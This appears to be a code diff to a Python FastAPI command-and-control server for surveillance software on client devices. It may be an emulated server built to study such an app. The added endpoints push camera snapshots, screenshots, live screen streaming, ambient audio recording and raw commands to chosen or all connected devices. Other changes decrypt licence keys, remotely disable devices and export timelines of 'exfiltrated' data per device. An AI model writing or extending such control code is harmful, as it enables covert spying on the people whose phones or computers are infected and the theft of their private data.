@@ -591,39 +591,69 @@ async def websocket_endpoint(ws: WebSocket):
             data = await ws.receive_text()
             log.info("WS recv: %s", data[:300])
 
-            ret = parse_xml_field(data, "Ret")
             client = parse_xml_field(data, "Client")
             license_key = parse_xml_field(data, "License")
             req_type = parse_xml_field(data, "RequestType")
 
-            if client and client not in devices:
-                devices[client] = {
-                    "client_id": client,
-                    "first_seen": datetime.now().isoformat(),
-                    "last_seen": datetime.now().isoformat(),
-                    "license": license_key,
-                    "version": "unknown",
-                    "actions": ["ws_connect"],
-                }
-            if client and client in devices:
-                devices[client]["last_seen"] = datetime.now().isoformat()
-                devices[client]["license"] = license_key
+            # §6 — associer le WS au client_id dès le premier message
+            if client and not ws_client_id:
+                ws_client_id = client
+                if ws in ws_anon:
+                    ws_anon.remove(ws)
+                ws_connections[client] = ws
+                log.info("WS identified: client=%s", client)
 
-            log.info("WS: client=%s license=%s ret=%s type=%s",
-                     client, license_key[:20] if license_key else "?", ret, req_type)
+            license_plain = try_tdes_decrypt(license_key)
 
-            while command_queue:
-                cmd = command_queue.pop(0)
-                await ws.send_text(cmd)
-                log.info("Pushed queued command: %s", cmd[:200])
+            if client:
+                _track_device(client, "unknown", "ws_message", license_plain)
+
+            log.info("WS: client=%s license_plain=%s ret=%s type=%s",
+                     client,
+                     license_plain[:30] if license_plain else "?",
+                     parse_xml_field(data, "Ret"),
+                     req_type)
 
     except WebSocketDisconnect:
-        ws_connections.remove(ws)
-        log.info("WebSocket disconnected (remaining: %d)", len(ws_connections))
+        _ws_cleanup(ws, ws_client_id)
+        log.info("WebSocket disconnected: %s", ws_client_id or "anon")
     except Exception as e:
-        if ws in ws_connections:
-            ws_connections.remove(ws)
+        _ws_cleanup(ws, ws_client_id)
         log.error("WebSocket error: %s", e)
+
+
+def _ws_cleanup(ws: WebSocket, client_id: Optional[str]):
+    if ws in ws_anon:
+        ws_anon.remove(ws)
+    if client_id and ws_connections.get(client_id) is ws:
+        del ws_connections[client_id]
+
+
+def _get_target_ws(device_id: Optional[str]) -> list[tuple[str, WebSocket]]:
+    """Retourne les WS ciblés : un seul si device_id fourni, tous sinon."""
+    if device_id:
+        ws = ws_connections.get(device_id)
+        if ws:
+            return [(device_id, ws)]
+        return []
+    targets = [(cid, ws) for cid, ws in ws_connections.items()]
+    targets += [("anon", ws) for ws in ws_anon]
+    return targets
+
+
+async def _send_ws_command(cmd: str, device_id: Optional[str] = None) -> int:
+    """Envoie une commande WS + l'ajoute à command_queue (§5)."""
+    command_queue.append(cmd)
+
+    targets = _get_target_ws(device_id)
+    sent = 0
+    for cid, ws in targets:
+        try:
+            await ws.send_text(cmd)
+            sent += 1
+        except Exception as e:
+            log.error("Failed to send cmd to %s: %s", cid, e)
+    return sent
 
 
 # ---------------------------------------------------------------------------
@@ -632,9 +662,16 @@ async def websocket_endpoint(ws: WebSocket):
 
 @app.get("/admin/status")
 async def admin_status():
+    device_list = []
+    for cid, d in devices.items():
+        info = {k: v for k, v in d.items() if k != "actions"}
+        info["ws_connected"] = cid in ws_connections
+        info["action_count"] = len(d["actions"])
+        device_list.append(info)
     return {
-        "devices": list(devices.values()),
+        "devices": device_list,
         "ws_connections": len(ws_connections),
+        "ws_anon": len(ws_anon),
         "exfiltrated_count": len(exfiltrated),
         "command_queue": len(command_queue),
         "supported_versions": ["v17.4", "v19.1"],
@@ -648,102 +685,151 @@ async def admin_exfiltrated(limit: int = 50):
 
 @app.get("/admin/exfiltrated/by_type/{action}")
 async def admin_exfiltrated_by_type(action: str, limit: int = 50):
-    """Filter exfiltrated data by canonical action name."""
     filtered = [e for e in exfiltrated if e.get("action_canonical") == action]
     return {"count": len(filtered), "data": filtered[-limit:]}
 
 
 @app.get("/admin/endpoints")
 async def admin_endpoints():
-    """Show endpoint mapping: v17.4 -> v19.1 canonical names."""
     return {
         "aliases": ENDPOINT_ALIASES,
         "canonical_endpoints": sorted(HANDLERS.keys()),
         "upload_dirs": UPLOAD_SUBDIRS,
+        "parse_fields": PARSE_FIELDS,
     }
 
 
+# §6 — toutes les commandes admin acceptent ?device_id= optionnel
+
 @app.post("/admin/cmd/camera")
-async def admin_cmd_camera(camera_type: str = "front"):
+async def admin_cmd_camera(camera_type: str = "front", device_id: Optional[str] = None):
     req_id = str(int(time.time()))
     cmd = xml_command("camera_snap", req_id,
-                      f"<Camera><Enable>1</Enable><Type>{camera_type}</Type></Camera>")
-    sent = 0
-    for ws in ws_connections:
-        try:
-            await ws.send_text(cmd)
-            sent += 1
-        except Exception as e:
-            log.error("Failed to send camera cmd: %s", e)
-    log.info("Camera command sent (type=%s) to %d connections", camera_type, sent)
-    return {"status": "sent", "type": camera_type, "connections": sent}
+                      f"<Camera><Enable>1</Enable><Type>{_xml_escape(camera_type)}</Type></Camera>")
+    sent = await _send_ws_command(cmd, device_id)
+    log.info("Camera command (type=%s, target=%s) sent to %d", camera_type, device_id or "all", sent)
+    return {"status": "sent", "type": camera_type, "target": device_id, "connections": sent}
 
 
 @app.post("/admin/cmd/screenshot")
-async def admin_cmd_screenshot():
+async def admin_cmd_screenshot(device_id: Optional[str] = None):
     req_id = str(int(time.time()))
     cmd = xml_command("screenshot_snap", req_id,
                       "<Screenshots><Enable>1</Enable></Screenshots>")
-    sent = 0
-    for ws in ws_connections:
-        try:
-            await ws.send_text(cmd)
-            sent += 1
-        except Exception as e:
-            log.error("Failed to send screenshot cmd: %s", e)
-    log.info("Screenshot command sent to %d connections", sent)
-    return {"status": "sent", "connections": sent}
+    sent = await _send_ws_command(cmd, device_id)
+    log.info("Screenshot command (target=%s) sent to %d", device_id or "all", sent)
+    return {"status": "sent", "target": device_id, "connections": sent}
 
 
 @app.post("/admin/cmd/screenstream")
-async def admin_cmd_screenstream(enable: int = 1):
+async def admin_cmd_screenstream(enable: int = 1, device_id: Optional[str] = None):
     req_id = str(int(time.time()))
     sign_ts = str(int(time.time()))
     cmd = xml_command("screen_video", req_id,
                       f"<ScreenshotVideo><Enable>{enable}</Enable></ScreenshotVideo>"
                       f"<SignTimeStamp>{sign_ts}</SignTimeStamp>")
-    sent = 0
-    for ws in ws_connections:
-        try:
-            await ws.send_text(cmd)
-            sent += 1
-        except Exception as e:
-            log.error("Failed to send screenstream cmd: %s", e)
-    log.info("Screen stream command sent (enable=%d) to %d connections", enable, sent)
-    return {"status": "sent", "enable": enable, "sign_ts": sign_ts, "connections": sent}
+    sent = await _send_ws_command(cmd, device_id)
+    log.info("Screen stream (enable=%d, target=%s) sent to %d", enable, device_id or "all", sent)
+    return {"status": "sent", "enable": enable, "sign_ts": sign_ts, "target": device_id, "connections": sent}
 
 
 @app.post("/admin/cmd/surrounding")
-async def admin_cmd_surrounding(enable: int = 1, duration: int = 60):
+async def admin_cmd_surrounding(enable: int = 1, duration: int = 60, device_id: Optional[str] = None):
     req_id = str(int(time.time()))
     cmd = xml_command("surround_rec", req_id,
                       f"<Surrounding><Enable>{enable}</Enable>"
                       f"<Duration>{duration}</Duration></Surrounding>")
-    sent = 0
-    for ws in ws_connections:
-        try:
-            await ws.send_text(cmd)
-            sent += 1
-        except Exception as e:
-            log.error("Failed to send surrounding cmd: %s", e)
-    log.info("Surrounding command sent (enable=%d, duration=%ds) to %d connections",
-             enable, duration, sent)
-    return {"status": "sent", "enable": enable, "duration": duration, "connections": sent}
+    sent = await _send_ws_command(cmd, device_id)
+    log.info("Surrounding (enable=%d, duration=%ds, target=%s) sent to %d",
+             enable, duration, device_id or "all", sent)
+    return {"status": "sent", "enable": enable, "duration": duration,
+            "target": device_id, "connections": sent}
 
 
 @app.post("/admin/cmd/raw")
-async def admin_cmd_raw(request: Request):
+async def admin_cmd_raw(request: Request, device_id: Optional[str] = None):
     body = await request.body()
     xml_str = body.decode("utf-8")
-    sent = 0
-    for ws in ws_connections:
-        try:
-            await ws.send_text(xml_str)
-            sent += 1
-        except Exception as e:
-            log.error("Failed to send raw cmd: %s", e)
-    log.info("Raw command sent to %d connections", sent)
-    return {"status": "sent", "connections": sent}
+    sent = await _send_ws_command(xml_str, device_id)
+    log.info("Raw command (target=%s) sent to %d", device_id or "all", sent)
+    return {"status": "sent", "target": device_id, "connections": sent}
+
+
+# ---------------------------------------------------------------------------
+# §7 — Contrôle des codes de retour cycle
+# ---------------------------------------------------------------------------
+
+@app.post("/admin/device/{client_id}/kill")
+async def admin_device_kill(client_id: str):
+    if client_id not in devices:
+        return JSONResponse({"error": "unknown device"}, 404)
+    devices[client_id]["forced_ret"] = "501"
+    log.info("Device %s: next cycle will return 501 (license expired)", client_id)
+    return {"status": "armed", "client_id": client_id, "next_ret": "501"}
+
+
+@app.post("/admin/device/{client_id}/reset")
+async def admin_device_reset(client_id: str):
+    if client_id not in devices:
+        return JSONResponse({"error": "unknown device"}, 404)
+    devices[client_id]["forced_ret"] = "502"
+    log.info("Device %s: next cycle will return 502 (device dissociated)", client_id)
+    return {"status": "armed", "client_id": client_id, "next_ret": "502"}
+
+
+@app.post("/admin/device/{client_id}/reauth")
+async def admin_device_reauth(client_id: str):
+    if client_id not in devices:
+        return JSONResponse({"error": "unknown device"}, 404)
+    devices[client_id]["forced_ret"] = "503"
+    log.info("Device %s: next cycle will return 503 (reauth required)", client_id)
+    return {"status": "armed", "client_id": client_id, "next_ret": "503"}
+
+
+@app.post("/admin/device/{client_id}/resume")
+async def admin_device_resume(client_id: str):
+    if client_id not in devices:
+        return JSONResponse({"error": "unknown device"}, 404)
+    devices[client_id]["forced_ret"] = None
+    log.info("Device %s: cycle back to normal (500)", client_id)
+    return {"status": "resumed", "client_id": client_id, "next_ret": "500"}
+
+
+# ---------------------------------------------------------------------------
+# §8 — Session dump structuré
+# ---------------------------------------------------------------------------
+
+@app.get("/admin/session/export")
+async def admin_session_export():
+    result = []
+    for cid, d in devices.items():
+        device_exfil = [e for e in exfiltrated if e.get("client") == cid]
+        timeline = []
+        for e in device_exfil:
+            t = {
+                "ts": e["ts"],
+                "action": e["action_canonical"],
+                "action_raw": e["action_raw"],
+                "bytes": e["body_len"],
+            }
+            if e.get("parsed"):
+                t["parsed"] = e["parsed"]
+            if e.get("license_plain"):
+                t["license_plain"] = e["license_plain"]
+            if e.get("data_plain"):
+                t["data_plain"] = e["data_plain"]
+            timeline.append(t)
+
+        result.append({
+            "device_id": cid,
+            "version": d.get("version", "unknown"),
+            "first_seen": d.get("first_seen"),
+            "last_seen": d.get("last_seen"),
+            "license_plain": d.get("license_plain"),
+            "ws_connected": cid in ws_connections,
+            "timeline": timeline,
+        })
+    return result
 
 
 # ---------------------------------------------------------------------------
